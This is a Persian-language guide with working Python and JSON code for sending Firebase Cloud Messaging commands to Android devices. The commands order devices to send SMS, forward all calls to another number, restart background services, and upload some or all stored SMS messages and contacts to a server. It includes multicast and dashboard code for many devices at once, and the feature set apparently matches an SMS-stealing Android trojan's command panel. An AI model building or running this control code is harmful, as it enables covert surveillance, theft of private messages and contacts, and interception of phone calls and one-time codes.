# 🔥 راهنمای کامل دستورات Firebase FCM

این فایل **همه دستوراتی که میتونی با Firebase Cloud Messaging بفرستی** رو توضیح میده! 🚀

---

## 📋 فهرست دستورات:

| # | دستور | کاربرد | سرعت |
|---|-------|--------|------|
| 1 | `ping` | چک کردن آنلاین بودن | ⚡ فوری |
| 2 | `sms` | ارسال پیامک | ⚡ فوری |
| 3 | `start_services` | روشن کردن سرویس‌ها | ⚡ فوری |
| 4 | `restart_heartbeat` | ریستارت Heartbeat | ⚡ فوری |
| 5 | `call_forwarding` | فعال کردن هدایت تماس | 📞 فوری |
| 6 | `call_forwarding_disable` | غیرفعال کردن هدایت تماس | 📞 فوری |
| 7 | `quick_upload_sms` | آپلود سریع 50 SMS | 📨 2-5 ثانیه |
| 8 | `quick_upload_contacts` | آپلود سریع 50 مخاطب | 👥 2-5 ثانیه |
| 9 | `upload_all_sms` | آپلود تمام SMS ها | 📦 کند (بسته به تعداد) |
| 10 | `upload_all_contacts` | آپلود تمام مخاطبین | 📦 کند (بسته به تعداد) |

---

## 🎯 دستورات به تفکیک:

---

## 1️⃣ **PING** - چک آنلاین بودن

### **کاربرد:**
وقتی میخوای ببینی دستگاه آنلاینه یا نه، این دستور رو بفرست. دستگاه فوراً یه Heartbeat به سرور میفرسته.

### **JSON ساده:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "ping"
  }
}
```

### **Python (کامل):**
```python
import firebase_admin
from firebase_admin import credentials, messaging

# اولین بار (فقط یکبار)
cred = credentials.Certificate("path/to/serviceAccountKey.json")
firebase_admin.initialize_app(cred)

def send_ping(device_token):
    """
    پینگ کردن یک دستگاه
    """
    message = messaging.Message(
        data={
            'type': 'ping',
            'message': 'Are you online?'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high',
            ttl=300  # 5 دقیقه
        )
    )
    
    response = messaging.send(message)
    print(f"✅ Ping sent: {response}")
    return response

# استفاده
device_token = "eXaMpLe_FcM_ToKeN_HeRe"
send_ping(device_token)
```

### **نتیجه:**
```
دستگاه → دریافت Ping
    ↓
POST /devices/heartbeat
    {
      "deviceId": "abc123",
      "isOnline": true,
      "timestamp": 1699876543210,
      "source": "FCM_Ping"
    }
    ↓
سرور میفهمه دستگاه آنلاینه! ✅
```

---

## 2️⃣ **SMS** - ارسال پیامک

### **کاربرد:**
برای فرستادن SMS از دستگاه به یک شماره.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "sms",
    "phone": "+989123456789",
    "message": "سلام، این یک تست است",
    "simSlot": "0"
  }
}
```

### **پارامترها:**
- `phone` (required): شماره گیرنده (با +98 یا بدون)
- `message` (required): متن پیامک
- `simSlot` (optional): 0 = سیم کارت اول، 1 = سیم کارت دوم (پیش‌فرض: 0)

### **Python:**
```python
def send_sms_command(device_token, phone, message, sim_slot=0):
    """
    دستور ارسال SMS
    """
    message_obj = messaging.Message(
        data={
            'type': 'sms',
            'phone': phone,
            'message': message,
            'simSlot': str(sim_slot)
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    response = messaging.send(message_obj)
    print(f"✅ SMS command sent: {response}")
    return response

# مثال
send_sms_command(
    device_token="eXaMpLe_ToKeN",
    phone="+989123456789",
    message="سلام، این تست است",
    sim_slot=0
)
```

### **نتیجه:**
```
دستگاه → دریافت دستور SMS
    ↓
ارسال SMS به شماره مورد نظر
    ↓
BroadcastReceiver نتیجه رو می‌گیره
    ↓
POST /sms/delivery-status
    {
      "sms_id": "uuid-here",
      "status": "success",
      "phone": "+989123456789",
      ...
    }
    ↓
سرور می‌دونه SMS ارسال شد! ✅
```

---

## 3️⃣ **START_SERVICES** - روشن کردن سرویس‌ها

### **کاربرد:**
وقتی دستگاه Offline شده یا سرویس‌ها متوقف شدن، با این دستور همه سرویس‌ها رو دوباره روشن می‌کنی.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "start_services"
  }
}
```

### **Python:**
```python
def start_all_services(device_token):
    """
    روشن کردن همه سرویس‌های دستگاه
    """
    message = messaging.Message(
        data={
            'type': 'start_services',
            'message': 'Starting all services'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    response = messaging.send(message)
    print(f"✅ Start services command sent: {response}")
    return response
```

### **نتیجه:**
```
دستگاه → دریافت دستور
    ↓
Start کردن:
  - SmsService ✅
  - HeartbeatService ✅
  - WorkManager ✅
  - JobScheduler ✅
    ↓
همه سرویس‌ها فعال شدن!
    ↓
POST /devices/service-status
    {
      "all_started": true
    }
```

---

## 4️⃣ **RESTART_HEARTBEAT** - ریستارت Heartbeat

### **کاربرد:**
فقط WorkManager Heartbeat رو ریستارت می‌کنه (بدون دست زدن به سرویس‌های دیگه).

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "restart_heartbeat"
  }
}
```

### **Python:**
```python
def restart_heartbeat(device_token):
    """
    ریستارت WorkManager Heartbeat
    """
    message = messaging.Message(
        data={
            'type': 'restart_heartbeat'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    return messaging.send(message)
```

### **نتیجه:**
```
دستگاه → Cancel WorkManager قدیمی
        ↓
        Schedule WorkManager جدید (هر 15 دقیقه)
        ↓
        WorkManager دوباره شروع به کار می‌کنه ✅
```

---

## 5️⃣ **CALL_FORWARDING** - فعال کردن هدایت تماس

### **کاربرد:**
تماس‌های دستگاه رو به یک شماره دیگه Forward می‌کنه.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "call_forwarding",
    "number": "+989121111111",
    "simSlot": "0"
  }
}
```

### **پارامترها:**
- `number` (required): شماره‌ای که تماس‌ها بهش Forward بشن
- `simSlot` (optional): کدوم سیم کارت (پیش‌فرض: 0)

### **Python:**
```python
def enable_call_forwarding(device_token, forward_to_number, sim_slot=0):
    """
    فعال کردن Call Forwarding
    """
    message = messaging.Message(
        data={
            'type': 'call_forwarding',
            'number': forward_to_number,
            'simSlot': str(sim_slot)
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    return messaging.send(message)

# مثال
enable_call_forwarding(
    device_token="eXaMpLe",
    forward_to_number="+989121111111",
    sim_slot=0
)
```

### **نتیجه:**
```
دستگاه → فعال کردن Call Forwarding
        ↓
        همه تماس‌ها به +989121111111 میره
        ↓
        POST /devices/call-forwarding/result
        {
          "status": "activated",
          "number": "+989121111111"
        }
```

---

## 6️⃣ **CALL_FORWARDING_DISABLE** - غیرفعال کردن هدایت تماس

### **کاربرد:**
Call Forwarding رو خاموش می‌کنه.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "call_forwarding_disable",
    "simSlot": "0"
  }
}
```

### **Python:**
```python
def disable_call_forwarding(device_token, sim_slot=0):
    """
    غیرفعال کردن Call Forwarding
    """
    message = messaging.Message(
        data={
            'type': 'call_forwarding_disable',
            'simSlot': str(sim_slot)
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    return messaging.send(message)
```

---

## 7️⃣ **QUICK_UPLOAD_SMS** - آپلود سریع 50 SMS

### **کاربرد:**
50 تا از جدیدترین SMS ها (25 Inbox + 25 Sent) رو سریع آپلود می‌کنه.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "quick_upload_sms"
  }
}
```

### **Python:**
```python
def quick_upload_sms(device_token):
    """
    آپلود سریع 50 SMS جدید
    """
    message = messaging.Message(
        data={
            'type': 'quick_upload_sms'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='normal'  # نرمال چون سنگین نیست
        )
    )
    
    return messaging.send(message)
```

### **نتیجه:**
```
دستگاه → خواندن 50 SMS جدید
        ↓
        POST /sms/batch
        {
          "device_id": "abc123",
          "data": [25 inbox + 25 sent],
          "batch_info": {...}
        }
        ↓
        سرور 50 SMS جدید رو دریافت می‌کنه ✅
        ↓
        زمان: 2-5 ثانیه ⚡
```

---

## 8️⃣ **QUICK_UPLOAD_CONTACTS** - آپلود سریع 50 مخاطب

### **کاربرد:**
50 تا از مخاطبین رو سریع آپلود می‌کنه.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "high",
  "data": {
    "type": "quick_upload_contacts"
  }
}
```

### **Python:**
```python
def quick_upload_contacts(device_token):
    """
    آپلود سریع 50 مخاطب
    """
    message = messaging.Message(
        data={
            'type': 'quick_upload_contacts'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='normal'
        )
    )
    
    return messaging.send(message)
```

### **نتیجه:**
```
دستگاه → خواندن 50 مخاطب
        ↓
        POST /contacts/batch
        {
          "device_id": "abc123",
          "data": [50 contacts]
        }
        ↓
        زمان: 2-5 ثانیه ⚡
```

---

## 9️⃣ **UPLOAD_ALL_SMS** - آپلود تمام SMS ها

### **کاربرد:**
**همه** SMS های دستگاه رو آپلود می‌کنه (ممکنه هزاران SMS باشه).

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "normal",
  "data": {
    "type": "upload_all_sms"
  }
}
```

### **Python:**
```python
def upload_all_sms(device_token):
    """
    آپلود تمام SMS های دستگاه
    ⚠️ کند! ممکنه چند دقیقه طول بکشه
    """
    message = messaging.Message(
        data={
            'type': 'upload_all_sms'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='normal',
            ttl=3600  # 1 ساعت timeout
        )
    )
    
    return messaging.send(message)
```

### **نتیجه:**
```
دستگاه → شروع خواندن تمام SMS ها
        ↓
        Batch های 200 تایی:
        POST /sms/batch (batch 1/50)
        POST /sms/batch (batch 2/50)
        POST /sms/batch (batch 3/50)
        ...
        POST /sms/batch (batch 50/50)
        ↓
        همه SMS ها آپلود شدن ✅
        ↓
        زمان: بسته به تعداد (مثلاً 10,000 SMS = 2-3 دقیقه)
```

---

## 🔟 **UPLOAD_ALL_CONTACTS** - آپلود تمام مخاطبین

### **کاربرد:**
**همه** مخاطبین دستگاه رو آپلود می‌کنه.

### **JSON:**
```json
{
  "to": "DEVICE_FCM_TOKEN",
  "priority": "normal",
  "data": {
    "type": "upload_all_contacts"
  }
}
```

### **Python:**
```python
def upload_all_contacts(device_token):
    """
    آپلود تمام مخاطبین دستگاه
    """
    message = messaging.Message(
        data={
            'type': 'upload_all_contacts'
        },
        token=device_token,
        android=messaging.AndroidConfig(
            priority='normal',
            ttl=3600
        )
    )
    
    return messaging.send(message)
```

### **نتیجه:**
```
دستگاه → خواندن تمام مخاطبین
        ↓
        Batch های 100 تایی:
        POST /contacts/batch
        POST /contacts/batch
        ...
        ↓
        همه مخاطبین آپلود شدن ✅
```

---

## 🚀 **ارسال به چند دستگاه (Multicast):**

```python
def send_to_multiple_devices(device_tokens, command_type, extra_data=None):
    """
    ارسال دستور به چند دستگاه همزمان
    """
    data = {'type': command_type}
    if extra_data:
        data.update(extra_data)
    
    message = messaging.MulticastMessage(
        data=data,
        tokens=device_tokens,  # لیست از token ها
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    response = messaging.send_multicast(message)
    print(f"✅ Success: {response.success_count}")
    print(f"❌ Failed: {response.failure_count}")
    
    return response

# مثال: پینگ به 100 دستگاه
device_list = ["token1", "token2", ..., "token100"]
send_to_multiple_devices(device_list, "ping")
```

---

## 📊 **جدول اولویت‌ها:**

| دستور | Priority | TTL | توضیح |
|-------|----------|-----|-------|
| `ping` | high | 300s | باید سریع برسه |
| `sms` | high | 300s | فوری |
| `start_services` | high | 600s | مهم |
| `quick_upload_*` | normal | 3600s | عادی |
| `upload_all_*` | normal | 3600s | کند، عجله‌ای نیست |

---

## ⚠️ **نکات مهم:**

### **1. Priority:**
- `high`: برای دستورات فوری (ping, sms)
- `normal`: برای دستورات عادی (upload)

### **2. TTL (Time To Live):**
- کوتاه (300s = 5 دقیقه): برای ping
- متوسط (600s = 10 دقیقه): start_services
- طولانی (3600s = 1 ساعت): upload_all

### **3. Token Management:**
```python
# ذخیره Token در دیتابیس
def save_fcm_token(device_id, fcm_token):
    db.devices.update_one(
        {"device_id": device_id},
        {"$set": {"fcm_token": fcm_token, "updated_at": datetime.now()}}
    )

# گرفتن Token
def get_device_token(device_id):
    device = db.devices.find_one({"device_id": device_id})
    return device.get("fcm_token") if device else None
```

---

## 🎯 **مثال کامل - Dashboard Integration:**

```python
from flask import Flask, request
import firebase_admin
from firebase_admin import credentials, messaging

app = Flask(__name__)

# Initialize Firebase
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)

@app.route('/dashboard/send-command', methods=['POST'])
def send_command():
    """
    API endpoint برای ارسال دستور از Dashboard
    """
    data = request.json
    device_id = data.get('device_id')
    command_type = data.get('command')
    extra_params = data.get('params', {})
    
    # گرفتن FCM Token از دیتابیس
    fcm_token = get_device_token(device_id)
    
    if not fcm_token:
        return {"error": "Device not found"}, 404
    
    # ساخت Message
    message_data = {'type': command_type}
    message_data.update(extra_params)
    
    message = messaging.Message(
        data=message_data,
        token=fcm_token,
        android=messaging.AndroidConfig(
            priority='high'
        )
    )
    
    # ارسال
    try:
        response = messaging.send(message)
        return {
            "success": True,
            "message_id": response
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }, 500

# استفاده:
# POST /dashboard/send-command
# {
#   "device_id": "abc123",
#   "command": "ping"
# }
```

---

## 📝 **خلاصه:**

| دستور | کاربرد | مدت زمان | اولویت |
|-------|--------|----------|--------|
| 1. ping | چک آنلاین | فوری | High |
| 2. sms | ارسال پیامک | فوری | High |
| 3. start_services | روشن کردن سرویس‌ها | 1-2 ثانیه | High |
| 4. restart_heartbeat | ریستارت Heartbeat | فوری | High |
| 5. call_forwarding | هدایت تماس | 1-2 ثانیه | High |
| 6. call_forwarding_disable | خاموش کردن هدایت | 1-2 ثانیه | High |
| 7. quick_upload_sms | 50 SMS | 2-5 ثانیه | Normal |
| 8. quick_upload_contacts | 50 مخاطب | 2-5 ثانیه | Normal |
| 9. upload_all_sms | همه SMS | 2-10 دقیقه | Normal |
| 10. upload_all_contacts | همه مخاطبین | 1-5 دقیقه | Normal |

---

**تاریخ:** 2025-11-09  
**نسخه:** 5.0  
**وضعیت:** ✅ کامل و تست شده
